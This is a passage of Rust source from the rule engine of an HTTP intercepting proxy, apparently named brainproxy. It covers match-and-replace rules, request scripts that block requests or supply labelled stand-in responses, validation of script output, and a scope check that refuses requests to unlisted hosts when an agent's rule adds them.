        // Best effort (the failure is on stderr and in the engine's own result either way), but
        // one that couldn't be written is tried again the next time it happens.
        if written.is_ok() {
            let mut noted = self.noted.lock().unwrap_or_else(|e| e.into_inner());
            let now = std::time::Instant::now();
            noted.extend(new.iter().map(|f| (f.id, (f.error.clone(), now))));
        }
    }
}

/// The last script failure noted for each rule, by rule id (see [`RULE_FAILURES`]).
pub fn noted_failures(store: &Store) -> Value {
    let noted = store.meta_get(RULE_FAILURES).ok().flatten().and_then(|text| serde_json::from_str::<Value>(&text).ok());
    noted.filter(Value::is_object).unwrap_or_else(|| json!({}))
}

/// Forgets the failures noted for the rules `keep` doesn't hold on to: ones removed, or
/// switched off or on since.
pub fn forget_failures(store: &Store, keep: impl Fn(u32) -> bool) -> Result<()> {
    let mut all = noted_failures(store);
    let Some(map) = all.as_object_mut().filter(|m| !m.is_empty()) else { return Ok(()) };
    let before = map.len();
    map.retain(|id, _| id.parse().is_ok_and(&keep));
    if map.len() == before {
        return Ok(());
    }
    store.meta_set(RULE_FAILURES, (!map.is_empty()).then(|| all.to_string()).as_deref())
}

/// The header a request rule's script's response carries, put there by brainproxy (one the
/// script writes is dropped): wherever the response is shown, it says the target didn't send it.
pub const ANSWER_HEADER: &str = "X-Brainproxy-Answer";

/// What a request rule's script did instead of letting the request be sent.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Stop {
    /// Don't send it, for this reason (as the script gave it, made safe to show).
    Block(String),
    /// Don't send it: this response (a whole HTTP/1.1 message, framed by brainproxy and
    /// carrying [`ANSWER_HEADER`]) stands in for the server's.
    Answer(Vec<u8>),
}

/// A request a request rule's script stopped: nothing of it is sent.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Stopped {
    /// The rule.
    pub id: u32,
    /// Who added (or last enabled) the rule.
    pub origin: Option<String>,
    pub stop: Stop,
}

impl Stopped {
    /// The history row's mark: who stopped the request, and how.
    pub fn edit(&self) -> Edit {
        let outcome = match self.stop {
            Stop::Block(_) => Outcome::Blocked,
            Stop::Answer(_) => Outcome::Answered,
        };
        Edit { by: self.origin.clone(), rule: Some(self.id), outcome: Some(outcome), ..Default::default() }
    }

    /// The exchange an engine takes in place of sending `request` to `target`: the script's
    /// response, received in no time. None for a blocked request.
    pub fn exchange(&self, target: &Target, request: Vec<u8>) -> Option<crate::http::client::Exchange> {
        Some(crate::http::client::Exchange {
            target: target.clone(),
            request,
            response: self.answer()?.to_vec(),
            duration_ms: 0,
            sni: None,
            stream: None,
        })
    }

    /// The script's response, when it answered.
    pub fn answer(&self) -> Option<&[u8]> {
        match &self.stop {
            Stop::Answer(response) => Some(response),
            Stop::Block(_) => None,
        }
    }

    /// Why the request wasn't sent, for a blocked request's error (and an answered request's,
    /// where an engine can't use a script's response).
    pub fn message(&self) -> String {
        match &self.stop {
            Stop::Block(why) if why.is_empty() => format!("blocked by the script of match-and-replace rule {}", self.id),
            Stop::Block(why) => format!("blocked by the script of match-and-replace rule {}: {why}", self.id),
            Stop::Answer(_) => format!(
                "answered by the script of match-and-replace rule {}: the response is the script's, the target sent nothing",
                self.id
            ),
        }
    }
}

/// A message after an engine's rules.
#[derive(Debug, Clone, Default)]
pub struct Ruled {
    /// The message to use.
    pub bytes: Vec<u8>,
    /// The message as it was, when a rule changed it.
    pub original: Option<Vec<u8>>,
    /// The rules that changed it, in the order they applied.
    pub fired: Vec<Fired>,
    /// The rules whose script failed on it: each left the message as it was.
    pub failed: Vec<Failed>,
    /// A request a request rule's script blocked or answered: it isn't sent. `bytes` is the
    /// request as the script saw it.
    pub stopped: Option<Stopped>,
}

impl Ruled {
    fn unchanged(bytes: Vec<u8>) -> Self {
        Ruled { bytes, ..Default::default() }
    }

    fn of(original: Vec<u8>, bytes: Vec<u8>, by: Vec<&CompiledRule>, failed: Vec<Failed>) -> Self {
        // A rule may undo another: then nothing changed, whatever fired on the way.
        if by.is_empty() || bytes == original {
            return Ruled { failed, ..Self::unchanged(original) };
        }
        let fired = by
            .iter()
            .map(|r| Fired { id: r.id, origin: r.origin.clone(), host_header_test: r.host_header_test })
            .collect();
        Ruled { bytes, original: Some(original), fired, failed, stopped: None }
    }

    pub fn changed(&self) -> bool {
        self.original.is_some()
    }

    /// The rules that changed it, and the one whose script stopped it, for a history row's
    /// `edited_by`.
    pub fn edits(&self) -> Vec<Edit> {
        let changed = self.fired.iter().map(|r| Edit { by: r.origin.clone(), rule: Some(r.id), ..Default::default() });
        changed.chain(self.stopped.as_ref().map(Stopped::edit)).collect()
    }

    /// Whether a row for it has something to say about the rules: one changed it, or stopped it.
    pub fn noted(&self) -> bool {
        self.changed() || self.stopped.is_some()
    }

    pub fn ids(&self) -> Vec<u32> {
        self.fired.iter().map(|r| r.id).collect()
    }

    /// The host an agent's rule brought into this request that the scope doesn't list: a rule
    /// added through MCP and not saved as a Host-header test. Such a request isn't sent, as a
    /// shared front end may route it to another site. A person's rule was warned about when it
    /// was saved.
    pub fn agent_host(&self, opts: &SendOptions, target: &Target) -> Option<String> {
        let before = self.original.as_deref()?;
        if !self.fired.iter().any(|r| r.origin.as_deref() == Some("mcp") && !r.host_header_test) {
            return None;
        }
        let had = opts.foreign_hosts(before, target);
        opts.foreign_hosts(&self.bytes, target).into_iter().find(|h| !had.contains(h))
    }

    /// Refuses the request [`Ruled::agent_host`] finds a host in.
    pub fn check_host(&self, opts: &SendOptions, target: &Target) -> Result<()> {
        match self.agent_host(opts, target) {
            Some(host) => Err(Error::OutOfScope(agent_host_refusal(&host))),
            None => Ok(()),
        }
    }
}

/// Why a request an agent's rule put `host` in isn't sent.
pub fn agent_host_refusal(host: &str) -> String {
    format!(
        "Host {host}: an agent's rule put a host the scope doesn't list in the request; \
         add the rule with --host-header-test for a Host-header test"
    )
}

/// The enabled rules of a project, or the ones of them an engine applies.
#[derive(Debug, Clone, Default)]
pub struct RuleSet {
    rules: Vec<CompiledRule>,
}

impl RuleSet {
    /// Every enabled rule (see [`compile_rules`]).
    pub fn compile(rules: &[Rule]) -> Result<Self> {
        Ok(RuleSet { rules: compile_rules(rules)? })
    }

    /// The rules `engine` applies, read from the project now; None when it has none, which is
    /// every project whose rules don't say otherwise for an engine other than the proxy. Only
    /// the engine's own rules are read: one that is another engine's, or that this build can't
    /// read (a newer build wrote it), can't stop this one's run. An unreadable rule is said so.
    pub fn load(store: &Store, engine: Engine) -> Result<Option<Arc<Self>>> {
        let stored: Vec<serde_json::Value> = store.setting(RULES_KEY)?;
        let mut rules = Vec::new();
        for value in stored {
            let id = value["id"].clone();
            match serde_json::from_value::<Rule>(value) {
                Ok(rule) if rule.engines().contains(&engine) => rules.push(rule),
                Ok(_) => {}
                Err(e) => {
                    eprintln!("brainproxy: match-and-replace rule {id} not applied: this build can't read it ({e})")
                }
            }
        }
        let set = Self::compile(&rules)?;
        Ok((!set.rules.is_empty()).then(|| Arc::new(set)))
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    fn active<'a>(
        &'a self,
        engine: Engine,
        host: &'a str,
        part: impl Fn(RuleLocation) -> bool + 'a,
    ) -> impl Iterator<Item = &'a CompiledRule> {
        self.rules.iter().filter(move |r| part(r.location) && r.applies(engine, host))
    }

    /// `request` to `host` after the rules `engine` applies there.
    pub fn request(&self, engine: Engine, host: &str, request: Vec<u8>) -> Ruled {
        let active: Vec<&CompiledRule> = self.active(engine, host, RuleLocation::is_request).collect();
        if active.is_empty() {
            return Ruled::unchanged(request);
        }
        let run = Run::new(engine, host);
        let (bytes, by, stopped) = request_rules(&active, &request, &run);
        Ruled { stopped, ..Ruled::of(request, bytes, by, run.failed()) }
    }

    /// `response` from `host`, the answer to `request`, after the rules `engine` applies there.
    /// The request is read for its method only: the response to a `HEAD` has no body for a body
    /// rule to change (see [`response_rules`]). Empty when there is none to go by.
    pub fn response(&self, engine: Engine, host: &str, request: &[u8], response: Vec<u8>) -> Ruled {
        let active: Vec<&CompiledRule> = self.active(engine, host, RuleLocation::is_response).collect();
        if active.is_empty() {
            return Ruled::unchanged(response);
        }
        let run = Run::new(engine, host);
        let (bytes, by) = response_rules(&active, &response, answers_head(request), &run);
        Ruled::of(response, bytes, by, run.failed())
    }

    /// The head of a response from `host` whose body is relayed as it arrives (an event stream),
    /// after the response-header rules `engine` applies there. A body rule needs the whole body,
    /// and a status rule could leave the relayed body without the framing it came with, so
    /// neither applies. Nor may a header rule change the head's Content-Length or
    /// Transfer-Encoding: the body follows as the server framed it.
    pub fn response_head(&self, engine: Engine, host: &str, head: Vec<u8>) -> Ruled {
        let active: Vec<&CompiledRule> = self.active(engine, host, |l| l == RuleLocation::ResponseHeader).collect();
        if active.is_empty() {
            return Ruled::unchanged(head);
        }
        let run = Run::new(engine, host);
        let (bytes, by) = response_rules(&active, &head, false, &run);
        let bytes = keep_framing(&head, bytes);
        Ruled::of(head, bytes, by, run.failed())
    }

    /// Whether `engine` has a rule for responses from `host`: a sender that only holds a
    /// response by reference copies it for the rules only then.
    pub fn rewrites_responses(&self, engine: Engine, host: &str) -> bool {
        self.active(engine, host, RuleLocation::is_response).next().is_some()
    }

    /// Whether a request rule's script sees `engine`'s requests to `host`: then whatever the
    /// engine would send there that isn't an HTTP request (a raw connection) is not made, as the
    /// script couldn't have blocked it.
    pub fn scripts_requests(&self, engine: Engine, host: &str) -> bool {
        self.active(engine, host, |l| l == RuleLocation::Request).next().is_some()
    }

    /// Whether a WebSocket message going `engine`'s way on a connection to `host` may be
    /// rewritten, so the relay only takes a message apart when a rule is waiting for it.
    pub fn rewrites_ws(&self, engine: Engine, host: &str) -> bool {
        self.active(engine, host, |l| l == RuleLocation::WsMessage).next().is_some()
    }

    /// A WebSocket message's payload after the rules for its direction (`engine`).
    pub fn ws_message(&self, engine: Engine, host: &str, payload: &[u8]) -> Ruled {
        let mut current = payload.to_vec();
        let mut by = Vec::new();
        let run = Run::new(engine, host);
        for rule in self.active(engine, host, |l| l == RuleLocation::WsMessage) {
            if !run.wants(rule, |dry| drop(rule.rewrite(&current, dry))) {
                continue;
            }
            let cx = run.cx(rule, || json!({ "message": with_bytes(json!({}), "text", "base64", &current) }));
            if let Some(new) = rule.rewrite(&current, &cx).filter(|new| *new != current) {
                current = new;
                by.push(rule);
            }
        }
        Ruled::of(payload.to_vec(), current, by, run.failed())
    }
}

/// The rules one engine other than the proxy applies to each exchange it sends, read when its
/// run starts. Cheap to clone.
#[derive(Debug, Clone)]
pub struct EngineRules {
    engine: Engine,
    set: Arc<RuleSet>,
    failures: FailureLog,
}

impl EngineRules {
    /// `engine`'s rules in the project; None when no enabled rule lists it.
    pub fn load(store: &Store, engine: Engine) -> Result<Option<Self>> {
        Ok(RuleSet::load(store, engine)?.map(|set| EngineRules { engine, set, failures: FailureLog::of(store) }))
    }

    /// `request` to `target` after the rules, before a session is applied to it (the proxy's
    /// order). Refused when an agent's rule put a host the scope doesn't list in it (see
    /// [`Ruled::agent_host`]); the client's own Host check still sees whatever goes out.
    pub fn request(&self, opts: &SendOptions, target: &Target, request: Vec<u8>) -> Result<Ruled> {
        let ruled = self.set.request(self.engine, &target.host, request);
        self.failures.note(self.engine, &ruled.failed);
        ruled.check_host(opts, target)?;
        Ok(ruled)
    }

    /// `request` to `target` after the engine's request rules alone, for a request sent without
    /// the other rules (a scan's baseline): what their scripts did with it, when one blocked or
    /// answered it.
    pub fn stop(&self, target: &Target, request: Vec<u8>) -> Option<Ruled> {
        let active: Vec<&CompiledRule> =
            self.set.active(self.engine, &target.host, |l| l == RuleLocation::Request).collect();
        if active.is_empty() {
            return None;
        }
        let run = Run::new(self.engine, &target.host);
        let (bytes, by, stopped) = request_rules(&active, &request, &run);
        let ruled = Ruled { stopped, ..Ruled::of(request, bytes, by, run.failed()) };
        self.failures.note(self.engine, &ruled.failed);
        ruled.stopped.is_some().then_some(ruled)
    }

    /// Whether a request rule's script sees requests to `target` (see
    /// [`RuleSet::scripts_requests`]).
    pub fn scripts_requests(&self, target: &Target) -> bool {
        self.set.scripts_requests(self.engine, &target.host)
    }

    /// Whether a response from `target` has rules to go through (see
    /// [`RuleSet::rewrites_responses`]).
    pub fn rewrites_responses(&self, target: &Target) -> bool {
        self.set.rewrites_responses(self.engine, &target.host)
    }

    /// `response` from `target`, the answer to `request`, after the rules: what the engine then
    /// reads.
    pub fn response(&self, target: &Target, request: &[u8], response: Vec<u8>) -> Ruled {
        let ruled = self.set.response(self.engine, &target.host, request, response);
        self.failures.note(self.engine, &ruled.failed);
        ruled
    }

    /// An event stream's response from `target` after the header rules only (see
    /// [`RuleSet::response_head`]).
    pub fn response_head(&self, target: &Target, response: Vec<u8>) -> Ruled {
        let ruled = self.set.response_head(self.engine, &target.host, response);
        self.failures.note(self.engine, &ruled.failed);
        ruled
    }
}

/// Applies request rules, whatever engines and hosts they name: for checking what a rule would
/// make of a request before it is saved. Returns the request unchanged when nothing matched.
pub fn apply_request_rules(rules: &[CompiledRule], req: Vec<u8>) -> Vec<u8> {
    let active: Vec<&CompiledRule> = rules.iter().filter(|r| r.location.is_request()).collect();
    if active.is_empty() {
        return req;
    }
    // A script's failure on a request made up for the check is not one of traffic's.
    request_rules(&active, &req, &Run { quiet: true, ..Run::new(Engine::Proxy, "") }).0
}

/// The request line's method, target and version, when it is those three with single spaces.
fn line_parts(first: &str) -> Option<(&str, &str, &str)> {
    let mut parts = first.split(' ');
    let (method, target, version) = (parts.next()?, parts.next()?, parts.next()?);
    (parts.next().is_none() && !method.is_empty() && !target.is_empty() && !version.is_empty())
        .then_some((method, target, version))
}

/// A request target as what comes before its path (the scheme and authority of an absolute
/// one), the path, and the query string after `?` if it has one.
fn target_parts(target: &str) -> (&str, &str, Option<&str>) {
    let start = match target.find("://") {
        Some(at) if !target.starts_with('/') => target[at + 3..].find(['/', '?']).map_or(target.len(), |i| at + 3 + i),
        _ => 0,
    };
    let (before, rest) = target.split_at(start);
    match rest.split_once('?') {
        Some((path, query)) => (before, path, Some(query)),
        None => (before, rest, None),
    }
}

/// A query parameter's name decoded (`%XX`, and `+` as a space), for comparing it.
fn decode_name(raw: &str) -> String {
    match crate::codec::decode("url", raw.as_bytes()) {
        Ok(decoded) => String::from_utf8_lossy(&decoded).into_owned(),
        Err(_) => raw.to_string(),
    }
}

/// A query parameter's name as a rule writes it into a query string.
fn encode_name(name: &str) -> String {
    match crate::codec::encode("url", name.as_bytes()) {
        Ok(encoded) => String::from_utf8_lossy(&encoded).into_owned(),
        Err(_) => name.to_string(),
    }
}

/// What a named-parameter rule makes of a query string; None when it changes nothing. The
/// rule's name is the parameter's decoded name; values are read and written as they are.
fn edit_query(rule: &CompiledRule, query: Option<&str>, cx: &Cx<'_>) -> Option<Option<String>> {
    let name = rule.name.as_deref()?;
    let mut pairs: Vec<String> =
        query.map(|q| q.split('&').filter(|p| !p.is_empty()).map(str::to_string).collect()).unwrap_or_default();
    let before = pairs.clone();
    let split = |pair: &str| -> (String, Option<String>) {
        match pair.split_once('=') {
            Some((k, v)) => (k.to_string(), Some(v.to_string())),
            None => (pair.to_string(), None),
        }
    };
    let is = |pair: &str| {
        let key = split(pair).0;
        key == name || decode_name(&key) == name
    };
    match rule.action {
        RuleAction::Add => pairs.extend(rule.fresh(cx).map(|new| format!("{}={new}", encode_name(name)))),
        RuleAction::Remove => pairs.retain(|p| !(is(p) && rule.matches(split(p).1.as_deref().unwrap_or("")))),
        RuleAction::Set => {
            let mut found = false;
            for pair in pairs.iter_mut().filter(|p| is(p)) {
                found = true;
                let (key, value) = split(pair);
                let value = value.unwrap_or_default();
                // A value left as it is leaves the parameter as written (`?debug` stays so).
                if let Some(new) = rule.rewrite_str(&value, cx).filter(|new| *new != value) {
                    *pair = format!("{key}={new}");
                }
            }
            if !found && rule.sets_any() {
                pairs.extend(rule.fresh(cx).map(|new| format!("{}={new}", encode_name(name))));
            }
        }
    }
    if pairs == before {
        return None;
    }
    Some((!pairs.is_empty()).then(|| pairs.join("&")))
}

/// Applies a rule on a part of the request line to it. Leaves a line that isn't `METHOD
/// TARGET VERSION` alone, and a result that would break the line in two.
fn edit_request_line(rule: &CompiledRule, first: &mut String, cx: &Cx<'_>) -> bool {
    let Some((method, target, version)) = line_parts(first) else { return false };
    let (before, path, query) = target_parts(target);
    let with_query = |q: Option<&str>| match q {
        Some(q) => format!("{before}{path}?{q}"),
        None => format!("{before}{path}"),
    };
    let new = match rule.location {
        RuleLocation::Method => rule.rewrite_str(method, cx).map(|m| format!("{m} {target} {version}")),
        RuleLocation::Path => rule.rewrite_str(path, cx).map(|p| match query {
            Some(q) => format!("{method} {before}{p}?{q} {version}"),
            None => format!("{method} {before}{p} {version}"),
        }),
        RuleLocation::QueryParam => {
            edit_query(rule, query, cx).map(|q| format!("{method} {} {version}", with_query(q.as_deref())))
        }
        _ => None,
    };
    match new {
        Some(new) if new != *first && !new.contains(['\r', '\n', '\0']) => {
            *first = new;
            true
        }
        _ => false,
    }
}

/// A head's header lines as a script reads them: name and value pairs.
fn header_pairs(headers: &[String]) -> Value {
    headers
        .iter()
        .map(|line| match header_parts(line) {
            Some((name, value)) => json!([name.trim(), value]),
            None => json!([line, ""]),
        })
        .collect()
}

/// A request as a script reads it, as it is when its rule gets to it.
fn request_view(first: &str, headers: &[String], body: &[u8]) -> Value {
    json!({ "request": request_object(first, headers, body) })
}

fn request_object(first: &str, headers: &[String], body: &[u8]) -> Value {
    let (method, target, _) = line_parts(first).unwrap_or(("", "", ""));
    let (_, path, query) = target_parts(target);
    let request = json!({
        "line": first, "method": method, "target": target, "path": path, "query": query,
        "headers": header_pairs(headers),
    });
    with_bytes(request, "body", "bodyBase64", body)
}

/// What a request rule's script made of a request.
enum Turn {
    Keep,
    /// The request line to send, and the header lines and body when the script gave them.
    Rewrite(String, Option<Vec<String>>, Option<Vec<u8>>),
    Stop(Stop),
}

/// The most header lines a script may give a request or a response.
const MAX_SCRIPT_HEADERS: usize = 500;

/// `s` as it may be shown: at most `max` characters, control characters and text-direction
/// overrides written out (a script's reason can be whatever a target sent).
fn shown(s: &str, max: usize) -> String {
    crate::sandbox::shown_cut(s, max)
}

/// The keys of `o` that aren't `known`: a misspelt key would otherwise be ignored in silence.
fn only_keys(o: &serde_json::Map<String, Value>, what: &str, known: &[&str]) -> std::result::Result<(), String> {
    match o.keys().find(|k| !known.contains(&k.as_str())) {
        Some(k) => Err(format!("its {what} has no {:?}; it has {}", shown(k, 40), known.join(", "))),
        None => Ok(()),
    }
}

/// Header lines a script gave, as `[[name, value], ...]` or `{ name: value }`: names are
/// tokens, values hold no line break or NUL.
fn script_headers(v: &Value, what: &str) -> std::result::Result<Vec<(String, String)>, String> {
    let pairs: Vec<(&str, &Value)> = match v {
        Value::Array(list) => list
            .iter()
            .map(|pair| match pair.as_array().map(Vec::as_slice) {
                Some([Value::String(name), value]) => Ok((name.as_str(), value)),
                _ => Err(format!("its {what} headers are [name, value] pairs, or an object of them")),
            })
            .collect::<std::result::Result<_, _>>()?,
        Value::Object(map) => map.iter().map(|(k, v)| (k.as_str(), v)).collect(),
        _ => return Err(format!("its {what} headers are [name, value] pairs, or an object of them")),
    };
    if pairs.len() > MAX_SCRIPT_HEADERS {
        return Err(format!("it gave {} {what} headers; at most {MAX_SCRIPT_HEADERS}", pairs.len()));
    }
    pairs
        .into_iter()
        .map(|(name, value)| {
            let value = match value {
                Value::String(s) => s.clone(),
                Value::Number(n) => n.to_string(),
                _ => return Err(format!("its {what} header {:?} has a value that isn't a string", shown(name, 40))),
            };
            if !is_token(name) {
                return Err(format!("{:?} can't be a header's name", shown(name, 40)));
            }
            if value.contains(['\r', '\n', '\0']) {
                return Err(format!("its {what} header {name} holds a line break or NUL"));
            }
            Ok((name.to_string(), value))
        })
        .collect()
}

/// A body a script gave: `body` as text or `bodyBase64`; None when it gave neither.
fn script_body(o: &serde_json::Map<String, Value>, what: &str) -> std::result::Result<Option<Vec<u8>>, String> {
    match (o.get("body").filter(|v| !v.is_null()), o.get("bodyBase64").filter(|v| !v.is_null())) {
        (Some(_), Some(_)) => Err(format!("its {what} has body and bodyBase64: give one")),
        (Some(Value::String(text)), None) => Ok(Some(text.as_bytes().to_vec())),
        (None, Some(Value::String(b))) => {
            STANDARD.decode(b.trim()).map(Some).map_err(|_| format!("its {what}'s bodyBase64 isn't base64"))
        }
        (None, None) => Ok(None),
        _ => Err(format!("its {what}'s body is a string")),
    }
}

/// The most of a request's body a request rule's script is handed: more is cut, and said
/// (`bodyTruncated`), so a large body can't put the request past its script.
const MAX_SCRIPT_BODY: usize = 1 << 20;

fn is_framing_name(name: &str) -> bool {
    name.eq_ignore_ascii_case("content-length") || name.eq_ignore_ascii_case("transfer-encoding")
}

/// What a request rule's script returned (in the shape `hook.js` gives it), read for the
/// request whose line is `first`: refused if it isn't one of the shapes allowed. `cut` is the
/// body it was handed, when that was cut.
fn read_turn(v: &Value, rule: u32, first: &str, cut: Option<&[u8]>) -> std::result::Result<Turn, String> {
    if v["keep"] == true {
        return Ok(Turn::Keep);
    }
    if let Some(why) = v["block"].as_str() {
        return Ok(Turn::Stop(Stop::Block(shown(why.trim(), 300))));
    }
    let (method, target, version) = line_parts(first).unwrap_or(("GET", "/", "HTTP/1.1"));
    if let Some(o) = v["request"].as_object() {
        // What it was given may come back with it (`{ ...req, method: "PUT" }`): `line`, `path`
        // and `query` say again what `method` and `target` say, and `bodyTruncated` is ours.
        let known = ["method", "target", "headers", "body", "bodyBase64", "line", "path", "query", "bodyTruncated"];
        only_keys(o, "request", &known)?;
        let text = |key: &str| -> std::result::Result<Option<&str>, String> {
            match o.get(key) {
                None | Some(Value::Null) => Ok(None),
                Some(Value::String(s)) => Ok(Some(s)),
                Some(_) => Err(format!("its request's {key} is a string")),
            }
        };
        let new_method = text("method")?.unwrap_or(method);
        if !is_token(new_method) {
            return Err(format!("{:?} can't be a request's method", shown(new_method, 40)));
        }
        if text("line")?.is_some_and(|line| line != first) {
            return Err("its request's line changed: change method and target instead".into());
        }
        let (_, path, query) = target_parts(target);
        let given_path = text("path")?.unwrap_or(path);
        let given_query = match o.get("query") {
            None => query,
            Some(Value::Null) => None,
            Some(Value::String(q)) => Some(q.as_str()),
            Some(_) => return Err("its request's query is a string or null".into()),
        };
        let moved = given_path != path || given_query != query;
        let built;
        let new_target = match text("target")? {
            Some(t) if t != target && moved => {
                return Err("its request changed target and path or query: change one of them".into())
            }
            Some(t) if t != target => t,
            _ if moved => {
                built = match given_query {
                    Some(q) => format!("{given_path}?{q}"),
                    None => given_path.to_string(),
                };
                built.as_str()
            }
            _ => target,
        };
        if new_target.is_empty() || new_target.chars().any(|c| c.is_whitespace() || c.is_control()) {
            return Err(format!("{:?} can't be a request's target", shown(new_target, 80)));
        }
        let headers = match o.get("headers").filter(|h| !h.is_null()) {
            Some(h) => Some(script_headers(h, "request")?.into_iter().map(|(n, v)| format!("{n}: {v}")).collect()),
            None => None,
        };
        let line = format!("{new_method} {new_target} {version}");
        // A body that isn't UTF-8 came with both: the text, unless the script changed it, is
        // only the bytes' stand-in.
        let body = match (o.get("body"), o.get("bodyBase64")) {
            (Some(Value::String(text)), Some(Value::String(b))) => {
                let bytes = STANDARD.decode(b.trim()).map_err(|_| "its request's bodyBase64 isn't base64".to_string())?;
                Some(if String::from_utf8_lossy(&bytes) == text.as_str() { bytes } else { text.as_bytes().to_vec() })
            }
            _ => script_body(o, "request")?,
        };
        // A body cut for the script that comes back as it was handed over stays whole.
        let body = body.filter(|new| cut.is_none_or(|cut| new.as_slice() != cut));
        return Ok(Turn::Rewrite(line, headers, body));
    }
    let Some(o) = v["response"].as_object() else { return Err("its result couldn't be read".into()) };
    only_keys(o, "response", &["status", "reason", "headers", "body", "bodyBase64"])?;
    let code = match o.get("status") {
        None | Some(Value::Null) => 200,
        Some(n) => n.as_u64().and_then(|n| u16::try_from(n).ok()).ok_or("its response's status is a number")?,
    };
    if !(200..=999).contains(&code) {
        return Err(format!("its response's status is {code}: a code from 200 to 999"));
    }
    let reason_text = match o.get("reason") {
        None | Some(Value::Null) => reason(code).to_string(),
        Some(Value::String(r)) if !r.contains(['\r', '\n', '\0']) => r.chars().take(200).collect(),
        Some(_) => return Err("its response's reason is a string without line breaks".into()),
    };
    let headers = match o.get("headers").filter(|h| !h.is_null()) {
        Some(h) => script_headers(h, "response")?,
        None => Vec::new(),
    };
    let body = script_body(o, "response")?.unwrap_or_default();
    // A 204 or 304 has no body, and says nothing of one's length.
    let bodiless = code == 204 || code == 304;
    if bodiless && !body.is_empty() {
        return Err(format!("its response is a {code}, which has no body"));
    }
    let mut out = format!("HTTP/1.1 {code} {reason_text}\r\n").into_bytes();
    for (name, value) in &headers {
        // The framing is brainproxy's, and so is the header that says whose response this is.
        if is_framing_name(name) || name.eq_ignore_ascii_case(ANSWER_HEADER) {
            continue;
        }
        out.extend_from_slice(format!("{name}: {value}\r\n").as_bytes());
    }
    if !bodiless {
        out.extend_from_slice(format!("Content-Length: {}\r\n", body.len()).as_bytes());
    }
    let mark = format!("{ANSWER_HEADER}: rule {rule}; this response is the rule's script's, the target sent nothing\r\n\r\n");
    out.extend_from_slice(mark.as_bytes());
    // The answer to a HEAD says how long the body would be, and has none.
    if !method.eq_ignore_ascii_case("HEAD") {
        out.extend_from_slice(&body);
    }
    Ok(Turn::Stop(Stop::Answer(out)))
}


/// A response as a script reads it; `body` is its body decoded, when it could be.
fn response_view(first: &str, headers: &[String], body: Option<&[u8]>) -> Value {
    let status = first.split(' ').nth(1).and_then(|code| code.parse::<u16>().ok());
    let response = json!({ "line": first, "status": status, "headers": header_pairs(headers), "body": null });
    json!({ "response": body.map_or(response.clone(), |body| with_bytes(response, "body", "bodyBase64", body)) })
}

/// One request rule's turn at a request's line, headers and body; whether it changed them.
fn request_rule(
    rule: &CompiledRule,
    first: &mut String,
    headers: &mut Vec<String>,
    body: &mut Vec<u8>,
    cx: &Cx<'_>,
) -> bool {
    match rule.location {
        RuleLocation::RequestLine => rule.rewrite_str(first, cx).is_some_and(|new| {
            let changed = new != *first;
            *first = new;
            changed
        }),
        RuleLocation::Method | RuleLocation::Path | RuleLocation::QueryParam => edit_request_line(rule, first, cx),
        RuleLocation::RequestHeader => {
            let before = headers.clone();
            apply_header_rule(rule, headers, cx);
            before != *headers
        }
        RuleLocation::RequestBody => rule.rewrite(body, cx).is_some_and(|new| {
            let changed = new != *body;
            *body = new;
            changed
        }),
        _ => false,
    }
}

/// The rules' turns at a request: the request after them, the rules that changed it, and the
/// request rule whose script stopped it, if one did (the rules after it then have no turn).
fn request_rules<'a>(
    active: &[&'a CompiledRule],
    req: &[u8],
    run: &Run<'_>,
) -> (Vec<u8>, Vec<&'a CompiledRule>, Option<Stopped>) {
    let (head, raw_body) = split_head_body(req);
    let (mut first, mut headers) = split_lines(head);
    // Body rules see the data, not the chunk framing (which they would break).
    let chunked = headers.iter().any(|h| {
        h.split_once(':').is_some_and(|(k, v)| {
            k.trim().eq_ignore_ascii_case("transfer-encoding") && v.to_ascii_lowercase().contains("chunked")
        })
    });
    let framed = headers.iter().any(|h| h.split_once(':').is_some_and(|(k, _)| is_framing_name(k.trim())));
    let has_body_rule = active.iter().any(|r| {
        (r.location == RuleLocation::RequestBody && r.matcher.is_some()) || r.location == RuleLocation::Request
    });
    let mut body = if chunked && has_body_rule { dechunk(raw_body) } else { raw_body.to_vec() };
    let mut body_changed = false;
    // A request rule's script rewrote it: brainproxy frames what it gave.
    let mut scripted = false;
    let mut stopped = None;
    let mut changed_by = Vec::new();
    for &rule in active {
        if rule.location == RuleLocation::Request {
            let Replacer::Script(hook) = &rule.replacer else { continue };
            match request_turn(rule, hook, &first, &headers, &body, run) {
                Turn::Keep => {}
                Turn::Rewrite(line, lines, new_body) => {
                    let lines = lines.unwrap_or_else(|| headers.clone());
                    let new_body = new_body.unwrap_or_else(|| body.clone());
                    if line != first || lines != headers || new_body != body {
                        (first, headers, body) = (line, lines, new_body);
                        scripted = true;
                        changed_by.push(rule);
                    }
                }
                Turn::Stop(stop) => {
                    stopped = Some(Stopped { id: rule.id, origin: rule.origin.clone(), stop });
                    break;
                }
            }
            continue;
        }
        // Dry, a script rule changes nothing: the line and headers are copies all the same.
        if !run.wants(rule, |dry| {
            request_rule(rule, &mut first.clone(), &mut headers.clone(), &mut body, dry);
        }) {
            continue;
        }
        let cx = run.cx(rule, || request_view(&first, &headers, &body));
        // A script is called for each header or parameter of a name: one that failed after
        // another was rewritten leaves neither changed. (A body goes to it in one call.)
        let kept = cx.message.is_some().then(|| (first.clone(), headers.clone()));
        let changed = request_rule(rule, &mut first, &mut headers, &mut body, &cx);
        if let Some((line, lines)) = kept.filter(|_| cx.failed.get()) {
            (first, headers) = (line, lines);
        } else if changed {
            body_changed |= rule.location == RuleLocation::RequestBody;
            changed_by.push(rule);
        }
    }
    if changed_by.is_empty() {
        // Sent as it came, chunks and all.
        return (req.to_vec(), changed_by, stopped);
    }
    if scripted {
        // Whatever framing the script's headers say, the body goes with a length of its own.
        headers.retain(|h| !h.split_once(':').is_some_and(|(k, _)| is_framing_name(k.trim())));
        if framed || !body.is_empty() {
            headers.push(format!("Content-Length: {}", body.len()));
        }
        return (join(&first, &headers, &body), changed_by, stopped);
    }
    if !body_changed {
        let body = if chunked && has_body_rule { raw_body } else { &body };
        return (join(&first, &headers, body), changed_by, stopped);
    }
    if chunked {
        // Only the chunks were taken off: a Content-Encoding still applies to the body.
        reframe(&mut headers, body.len(), false);
        return (join(&first, &headers, &body), changed_by, stopped);
    }
    let bytes = RawRequest::from_bytes(join(&first, &headers, &body)).update_content_length().into_bytes();
    (bytes, changed_by, stopped)
}

/// A request rule's script's turn at the request as the rules before it left it. A script
/// that fails (it throws, runs past a limit, or returns what can't be read) leaves the request
/// as it is, and the failure is noted.
